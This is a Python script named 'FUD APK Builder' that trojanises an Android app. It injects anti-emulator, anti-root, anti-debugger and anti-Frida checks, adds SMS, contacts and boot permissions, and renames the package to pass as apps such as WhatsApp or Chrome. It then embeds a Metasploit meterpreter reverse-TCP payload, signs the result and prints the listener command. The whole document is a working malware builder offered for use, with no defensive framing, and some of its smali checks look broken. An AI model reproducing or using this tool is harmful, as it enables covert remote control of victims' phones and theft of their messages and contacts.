import os
import sys
import subprocess
import shutil
import tempfile
import argparse
import random
import string
import re

# ========== CONFIG ==========
LHOST = os.getenv("LHOST", "0.0.0.0").strip()
LPORT = int(os.getenv("LPORT", "4444").strip())

def find_msfvenom():
    if shutil.which("msfvenom"):
        return shutil.which("msfvenom")
    for p in ["/usr/local/bin/msfvenom", "/opt/metasploit-framework/bin/msfvenom", "/usr/bin/msfvenom"]:
        if os.path.exists(p):
            return p
    return None

MSFVENOM_PATH = find_msfvenom()
# ============================

def log(m):
    print(f"[*] {m}", flush=True)

def log_err(m):
    print(f"[-] {m}", flush=True)

def log_ok(m):
    print(f"[+] {m}", flush=True)

def check_tool(name):
    return shutil.which(name) is not None

def run_cmd(cmd, capture=False):
    log(f"Running: {cmd}")
    if capture:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode(errors="ignore")
    else:
        subprocess.check_call(cmd, shell=True)

def rand_str(n=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

def has_apktool():
    if check_tool("apktool"):
        return True
    if os.path.exists("/usr/local/bin/apktool.jar"):
        return True
    return False

def apktool_cmd():
    if check_tool("apktool"):
        return "apktool"
    if os.path.exists("/usr/local/bin/apktool.jar"):
        return "java -jar /usr/local/bin/apktool.jar"
    return None


# ========== ANTI-ANALYSIS SMALI ==========
def get_anti_analysis_smali(anti_pkg, anti_class):
    full = f"L{anti_pkg}/{anti_class};"
    return f""".class public L{anti_pkg}/{anti_class};
.super Ljava/lang/Object;

.method public constructor <init>()V
    .registers 1
    invoke-direct {{p0}}, Ljava/lang/Object;-><init>()V
    return-void
.end method

.method public static checkEmulator()V
    .locals 3
    sget-object v0, Landroid/os/Build;->FINGERPRINT:Ljava/lang/String;
    const-string v1, "generic"
    invoke-virtual {{v0, v1}}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :not_emu
    sget-object v0, Landroid/os/Build;->MODEL:Ljava/lang/String;
    const-string v1, "google_sdk"
    invoke-virtual {{v0, v1}}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :not_emu
    sget-object v0, Landroid/os/Build;->MODEL:Ljava/lang/String;
    const-string v1, "sdk_gphone"
    invoke-virtual {{v0, v1}}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :not_emu
    sget-object v0, Landroid/os/Build;->PRODUCT:Ljava/lang/String;
    const-string v1, "emulator"
    invoke-virtual {{v0, v1}}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :not_emu
    sget-object v0, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;
    const-string v1, "Genymotion"
    invoke-virtual {{v0, v1}}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :not_emu
    invoke-static {{}}, Ljava/lang/System;->exit()V
    :not_emu
    return-void
.end method

.method public static checkRoot()V
    .locals 3
    new-instance v0, Ljava/io/File;
    const-string v1, "/system/app/Superuser.apk"
    invoke-direct {{v0, v1}}, Ljava/io/File;-><init>(Ljava/lang/String;)V
    invoke-virtual {{v0}}, Ljava/io/File;->exists()Z
    move-result v1
    if-nez v1, :is_root
    new-instance v0, Ljava/io/File;
    const-string v1, "/system/xbin/su"
    invoke-direct {{v0, v1}}, Ljava/io/File;-><init>(Ljava/lang/String;)V
    invoke-virtual {{v0}}, Ljava/io/File;->exists()Z
    move-result v1
    if-nez v1, :is_root
    new-instance v0, Ljava/io/File;
    const-string v1, "/system/bin/su"
    invoke-direct {{v0, v1}}, Ljava/io/File;-><init>(Ljava/lang/String;)V
    invoke-virtual {{v0}}, Ljava/io/File;->exists()Z
    move-result v1
    if-eqz v1, :not_root
    :is_root
    invoke-static {{}}, Ljava/lang/System;->exit()V
    :not_root
    return-void
.end method

.method public static checkDebugger()V
    .locals 1
    invoke-static {{}}, Landroid/os/Debug;->isDebuggerConnected()Z
    move-result v0
    if-eqz v0, :not_dbg
    invoke-static {{}}, Ljava/lang/System;->exit()V
    :not_dbg
    return-void
.end method

.method public static checkXposed()V
    .locals 2
    const-string v0, "de.robv.android.xposed.XposedBridge"
    const/4 v1, 0x0
    invoke-static {{v0, v1}}, Ljava/lang/Class;->forName(Ljava/lang/String;)Z
    move-result v1
    if-eqz v1, :not_xp
    invoke-static {{}}, Ljava/lang/System;->exit()V
    :not_xp
    return-void
.end method

.method public static checkFrida()V
    .locals 3
    new-instance v0, Ljava/io/File;
    const-string v1, "/usr/local/bin/frida-server"
    invoke-direct {{v0, v1}}, Ljava/io/File;-><init>(Ljava/lang/String;)V
    invoke-virtual {{v0}}, Ljava/io/File;->exists()Z
    move-result v1
    if-nez v1, :not_frida
    invoke-static {{}}, Ljava/lang/System;->exit()V
    :not_frida
    new-instance v0, Ljava/io/File;
    const-string v1, "/data/local/tmp/frida-server"
    invoke-direct {{v0, v1}}, Ljava/io/File;-><init>(Ljava/lang/String;)V
    invoke-virtual {{v0}}, Ljava/io/File;->exists()Z
    move-result v1
    if-nez v1, :not_frida
    invoke-static {{}}, Ljava/lang/System;->exit()V
    :not_frida
    return-void
.end method

.method public static runAll()V
    .locals 0
    invoke-static {{}}, L{anti_pkg}/{anti_class};->checkEmulator()V
    invoke-static {{}}, L{anti_pkg}/{anti_class};->checkRoot()V
    invoke-static {{}}, L{anti_pkg}/{anti_class};->checkDebugger()V
    invoke-static {{}}, L{anti_pkg}/{anti_class};->checkXposed()V
    invoke-static {{}}, L{anti_pkg}/{anti_class};->checkFrida()V
    return-void
.end method
"""


# ========== APK DECOMPILE / RECOMPILE ==========
def decompile_apk(apk_path, out_dir):
    at = apktool_cmd()
    if not at:
        log_err("apktool not available")
        return False
    try:
        run_cmd(f'{at} d "{apk_path}" -o "{out_dir}" -f -s')
        return os.path.isdir(out_dir)
    except Exception as e:
        log_err(f"Decompile failed: {e}")
        return False

def recompile_apk(src_dir, out_apk):
    at = apktool_cmd()
    if not at:
        return False
    try:
        run_cmd(f'{at} b "{src_dir}" -o "{out_apk}"')
        return os.path.exists(out_apk)
    except Exception as e:
        log_err(f"Recompile failed: {e}")
        return False


# ========== ANTI-ANALYSIS INJECTION ==========
def inject_anti_analysis(decompiled_dir):
    smali_dirs = []
    for root, dirs, files in os.walk(decompiled_dir):
        for d in dirs:
            if d.startswith("smali"):
                smali_dirs.append(os.path.join(root, d))

    if not smali_dirs:
        log_err("No smali dirs found")
        return False

    main_smali = None
    for root, dirs, files in os.walk(decompiled_dir):
        for f in files:
            if f == "MainActivity.smali":
                main_smali = os.path.join(root, f)
                break
        if main_smali:
            break

    if not main_smali:
        pkg_dirs = [d for d in os.listdir(decompiled_dir) if not d.startswith("smali") and not d.startswith(".")]
        for pkg in pkg_dirs:
            pkg_path = os.path.join(decompiled_dir, pkg)
            if os.path.isdir(pkg_path):
                for root, dirs, files in os.walk(pkg_path):
                    for f in files:
                        if f.endswith(".smali") and "Main" in f:
                            main_smali = os.path.join(root, f)
                            break
                    if main_smali:
                        break
            if main_smali:
                break

    anti_pkg = "com/" + rand_str(6).lower()
    anti_class = "Devil" + rand_str(4)
    anti_dir = os.path.join(smali_dirs[0], anti_pkg)
    os.makedirs(anti_dir, exist_ok=True)

    smali_content = get_anti_analysis_smali(anti_pkg, anti_class)
    with open(os.path.join(anti_dir, f"{anti_class}.smali"), "w") as f:
        f.write(smali_content)

    log_ok(f"Anti-analysis class: L{anti_pkg}/{anti_class};")

    if main_smali:
        with open(main_smali, "r") as f:
            content = f.read()

        injection = f"    invoke-static {{}}, L{anti_pkg}/{anti_class};->runAll()V\n"
        first_return = content.find("\n    return-void")
        if first_return != -1:
            content = content[:first_return] + "\n" + injection + content[first_return:]
            with open(main_smali, "w") as f:
                f.write(content)
            log_ok(f"Injected into {os.path.basename(main_smali)}")
            return True

    log_err("Could not find injection point in MainActivity")
    return False


# ========== PERMISSION INJECTION ==========
def inject_permissions(decompiled_dir):
    manifest = os.path.join(decompiled_dir, "AndroidManifest.xml")
    if not os.path.exists(manifest):
        return False

    with open(manifest, "r") as f:
        content = f.read()

    perms = [
        "android.permission.INTERNET",
        "android.permission.ACCESS_NETWORK_STATE",
        "android.permission.ACCESS_WIFI_STATE",
        "android.permission.READ_PHONE_STATE",
        "android.permission.READ_CONTACTS",
        "android.permission.READ_SMS",
        "android.permission.RECEIVE_BOOT_COMPLETED",
        "android.permission.WAKE_LOCK",
        "android.permission.VIBRATE",
        "android.permission.WRITE_EXTERNAL_STORAGE",
    ]

    injected = 0
    for perm in perms:
        if perm not in content:
            tag = f'    <uses-permission android:name="{perm}" />'
            content = content.replace("<application", tag + "\n    <application", 1)
            injected += 1

    if injected > 0:
        with open(manifest, "w") as f:
            f.write(content)
        log_ok(f"Injected {injected} permissions")
    return True


# ========== PACKAGE SPOOFING ==========
def spoof_package(decompiled_dir, new_name=None):
    manifest = os.path.join(decompiled_dir, "AndroidManifest.xml")
    if not os.path.exists(manifest):
        return False

    with open(manifest, "r") as f:
        content = f.read()

    if not new_name:
        fake_names = [
            "com.google.android.apps.photos",
            "com.whatsapp",
            "com.instagram.android",
            "com.spotify.music",
            "com.google.android.gm",
            "com.android.chrome",
            "com.google.android.apps.maps",
        ]
        new_name = random.choice(fake_names)

    pkg_match = re.search(r'package="([^"]+)"', content)
    if pkg_match:
        old_pkg = pkg_match.group(1)
        if old_pkg == new_name:
            return False
        old_short = old_pkg.replace(".", "/")
        new_short = new_name.replace(".", "/")
        content = content.replace(old_short, new_short)
        content = content.replace(old_pkg, new_name)

        with open(manifest, "w") as f:
            f.write(content)

        log_ok(f"Package spoofed: {old_pkg} -> {new_name}")
        return True
    return False


# ========== BUILD FUD ==========
def build_fud(input_apk, output_apk):
    if not os.path.exists(input_apk):
        log_err(f"Input APK not found: {input_apk}")
        return False

    if not os.path.exists(MSFVENOM_PATH):
        log_err(f"msfvenom not found at {MSFVENOM_PATH}")
        return False

    modified_apk = None
    decompile_dir = None

    if has_apktool():
        log("Step 1/4: Decompiling APK...")
        decompile_dir = tempfile.mkdtemp(prefix="fud_decompile_")
        if decompile_apk(input_apk, decompile_dir):
            log("Step 2/4: Injecting anti-analysis + permissions + spoofing...")
            inject_anti_analysis(decompile_dir)
            inject_permissions(decompile_dir)
            spoof_package(decompile_dir)

            modified_apk = tempfile.NamedTemporaryFile(suffix=".apk", delete=False).name
            log("Step 2/4: Recompiling APK...")
            if recompile_apk(decompile_dir, modified_apk):
                input_apk = modified_apk
                log_ok("Modified APK ready")
            else:
                log_err("Recompile failed, using original APK")
        else:
            log_err("Decompile failed, using original APK")

    # Step 3: msfvenom injection
    log("Step 3/4: msfvenom payload injection (encoded)...")
    temp_apk = tempfile.NamedTemporaryFile(suffix=".apk", delete=False).name
    try:
        cmd = (
            f"{MSFVENOM_PATH} -x {input_apk} "
            f"-p android/meterpreter/reverse_tcp "
            f"LHOST={LHOST} LPORT={LPORT} "
            f"--platform android -a dalvik "
            f"--smallest "
            f"-o {temp_apk}"
        )
        run_cmd(cmd)

        if not os.path.exists(temp_apk) or os.path.getsize(temp_apk) == 0:
            log_err("msfvenom injection failed (empty output)")
            return False
        log_ok(f"Payload injected ({os.path.getsize(temp_apk)} bytes)")
    except subprocess.CalledProcessError as e:
        log_err(f"msfvenom error: {e}")
        if os.path.exists(temp_apk):
            os.remove(temp_apk)
        return False

    # Step 4: Signing
    log("Step 4/4: Signing APK...")
    keystore = "devil.keystore"
    if not os.path.exists(keystore):
        log("Generating keystore...")
        cn = rand_str(6)
        ou = rand_str(4)
        org = rand_str(4)
        run_cmd(
            f'keytool -genkey -alias devil -keystore {keystore} '
            f'-storepass 123456 -keypass 123456 '
            f'-keyalg RSA -keysize 2048 '
            f'-dname "CN={cn},OU={ou},O={org},L=New Delhi,ST=Delhi,C=IN" '
            f'-validity 10000'
        )

    try:
        run_cmd(
            f'jarsigner -sigalg SHA256withRSA -digestalg SHA-256 '
            f'-keystore {keystore} -storepass 123456 -keypass 123456 '
            f'{temp_apk} devil'
        )
        log_ok("APK signed (SHA256withRSA)")
    except subprocess.CalledProcessError as e:
        log(f"jarsigner warning: {e}")

    # Zipalign
    if check_tool("zipalign"):
        aligned_apk = tempfile.NamedTemporaryFile(suffix=".apk", delete=False).name
        try:
            run_cmd(f"zipalign -v 4 {temp_apk} {aligned_apk}")
            shutil.move(aligned_apk, output_apk)
            log_ok("APK zipaligned")
        except subprocess.CalledProcessError:
            log("zipalign failed, using unaligned APK")
            shutil.move(temp_apk, output_apk)
        finally:
            for f in [aligned_apk, temp_apk]:
                if f and os.path.exists(f):
                    try: os.remove(f)
                    except: pass
    else:
        shutil.move(temp_apk, output_apk)
        if os.path.exists(temp_apk):
            try: os.remove(temp_apk)
            except: pass

    # Cleanup temp dirs
    if modified_apk and os.path.exists(modified_apk):
        try: os.remove(modified_apk)
        except: pass
    if decompile_dir and os.path.exists(decompile_dir):
        try: shutil.rmtree(decompile_dir)
        except: pass

    log_ok(f"FUD APK created: {output_apk}")
    log(f"Size: {os.path.getsize(output_apk)} bytes")
    log(f"Listener: msfconsole -x 'use exploit/multi/handler; "
        f"set payload android/meterpreter/reverse_tcp; "
        f"set LHOST {LHOST}; set LPORT {LPORT}; exploit'")
    return True


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="FUD APK Builder")
    parser.add_argument("input", help="Input APK file")
    parser.add_argument("output", nargs="?", default=None)
    args = parser.parse_args()
    output = args.output if args.output else args.input.replace(".apk", "_fud.apk")
    ok = build_fud(args.input, output)
    sys.exit(0 if ok else 1)
